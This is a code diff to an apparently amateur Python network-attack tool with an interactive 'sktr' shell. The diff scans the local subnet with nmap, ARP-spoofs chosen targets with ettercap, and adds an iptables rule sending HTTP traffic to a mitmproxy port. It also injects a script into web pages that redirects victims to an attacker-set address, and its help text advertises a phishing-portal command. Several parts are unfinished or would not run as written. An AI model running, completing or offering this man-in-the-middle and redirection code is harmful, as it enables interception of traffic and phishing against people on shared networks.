@@ -12,7 +12,6 @@ import mitmproxy
 os.system("cat src/banner.txt | lolcat")
 
 
-
 def main():
     try:
 
@@ -25,15 +24,24 @@ def main():
             print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent Interface:",f"\u001b[33;1m{current_iface}") 
             print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent SSID:", f"\u001b[33;1m{current_ssid}") 
             print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent inet:", f"\u001b[33;1m{current_addr}")
-            
+
         def clear():
-            os.system("clear")                  
+            os.system("clear")
 
         def scan():
             addr = os.popen("ip route show | grep -i -m1 'default via' | awk '{print $3}'").read()
             addr = addr.replace("\n","")
-            out = os.popen("nmap " + addr + "/24 -n -sP | grep -i 'Nmap scan report' | awk '{print $5}'").read()
-            print(" " "\u001b[35;1m[➔ Scan]: " "\u001b[0mScanned IP Addresses:", " " "\n" f" \u001b[33;1m{out}")
+            #scaniface = input("\n"" " "\u001b[34;1mEnter the name of your network interface: ") 
+            #out = os.popen("sudo arp-scan -I "+scaniface+" -l > src/scan.txt").read()
+            out = os.popen("nmap " + addr + "/24 -n -sP | grep -i 'Nmap scan report' | awk '{print $5}' > src/scan.txt").read()
+            with open('src/scan.txt', 'r') as scant:
+                outlist = scant.readlines()
+                outform = []
+                for ip in outlist:
+                    outform.append(ip.replace("\n",""))
+                scanstring = ' '.join([str(scanout) for scanout in outform])
+                print("\n" " " "\u001b[35;1m[➔ Scan]: " "\u001b[0mConnected IP Addresses:", " " "\n" "\n" f" \u001b[33;1m{scanstring.split()}")
+            open('src/scan.txt','w').close()
         
         def target():
             with open('src/target.txt', 'a') as targetf:
@@ -48,7 +56,7 @@ def main():
                 print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
             else:
                 with open('src/target.txt', 'r') as targetf:
-                    print(" " "\u001b[35;1m[➔ Info]: " " Running ARP Spoofing...")
+                    print("\n "" " "\u001b[35;1m[➔ Info]: " " Running ARP Spoofing...")
                     time.sleep(0.5)
                     ettercommand = ("sudo ettercap -Tq -M ARP")
                     with open('src/arp.txt','r') as arp:
@@ -57,68 +65,72 @@ def main():
                         for ip in iplist:
                             iplistformatted.append(ip.replace("\n",""))
                         ipstring = ' '.join([str(arpip) for arpip in iplistformatted])
-                        print(ipstring)
+                        #print(ipstring)
                         try:
-                            os.popen("sudo ettercap -Tq -M ARP "+ ipstring)
+                            os.popen("sudo ettercap -D -M ARP "+ ipstring).read()
+                            print("\n" " " "\u001b[35;1m[➔ Info]:" " " "\u001b[35;1mArp Spoofing done")
+                            print("\n" " " "\u001b[35;1m[➔ Info]: " " Setting up iptables rules...")
+                            os.popen("iptables -t nat -A PREROUTING -p TCP -j REDIRECT --destination-port 80 --to-port 8080").read() 
+                            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1mhtspoof done!")
                         except:
                             print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mPlease make sure that the IP exists and is formatted correctly!")
-                            
 
-
-                print(" " "\u001b[35;1m[➔ Info]: " " Setting up iptables rules...")
-                os.popen("iptables -t nat -A PREROUTING -p TCP -j REDIRECT --destination-port 80 --to-port 8080").read() 
-                print(" " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1mhtspoof done!")
                 open('src/target.txt', 'w').close()
  
-        def redirect():
+        def redirectlog():
+            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;Please be sure to run htspoof on your target before setting your redirect IP")
             spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ")
             def response(flow):
                 flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://"+spoofip+"</script>")
-            
+
         def portal():
             return 0
-            
-            
+        
+        def iplookup():
+            lookupip = input("\n"" " "\u001b[34;1mEnter the IP address to lookup: ")
+
+
 
         def commands():
-            helpstr = '''\n\n Available Commands:           
-                            
+            helpstr = '''\n\n Available Commands:
+
                             \u001b[33;1mcommands - Displays this help page
 
                             \u001b[33;1mscan - Scans the current network for all devices
 
-                            \u001b[33;1mtarget - Set target device (format: target <ip>)
+                            \u001b[33;1mtarget - Set target device
 
                             \u001b[33;1mhtspoof - Redirect user to specific webpage
 
-                            \u001b[33;1mredirect - Set the redirection IP for all HTTP pages
+                            \u001b[33;1mredirectlog - Set the redirection IP for all HTTP pages and monitor traffic (format: <ip>:<port>)
 
                             \u001b[33;1mportal - Generate phishing page/portal for redirection
-                           
+
+                            \u001b[33;1miplookup - Find out device name of IP (If it exists)
+
                            '''
-            print(helpstr)  
+            print(helpstr)
 
 
 
         def shell():
  
-            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"redirect":redirect,"commands":commands,"portal":portal,"clear":clear}
+            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"redirectlog":redirectlog,"commands":commands,"portal":portal,"iplookup":iplookup,"clear":clear}
 
             info_splash()
 
             print(" " '\u001b[35m[Type "commands" to get a list of available commands]')
-            
+
             while True:
                 prompt = input(" " "\n" "\n"" \u001b[36;1msktr❯❯\u001b[0m ")
-                
+
                 try:
                     cmdlist[prompt]()
                 except:
                     print("\n" " " "\u001b[31;1mInvalid Command") 
 
-                
-        
-# Running main functions
+
+# Running Shell
 
         shell()
 
@@ -126,7 +138,6 @@ def main():
 
     except KeyboardInterrupt:
         print("\n" "\n" " \u001b[31;1mExiting...")
-        time.sleep(0.5)
 
 
 # Getting root privilages
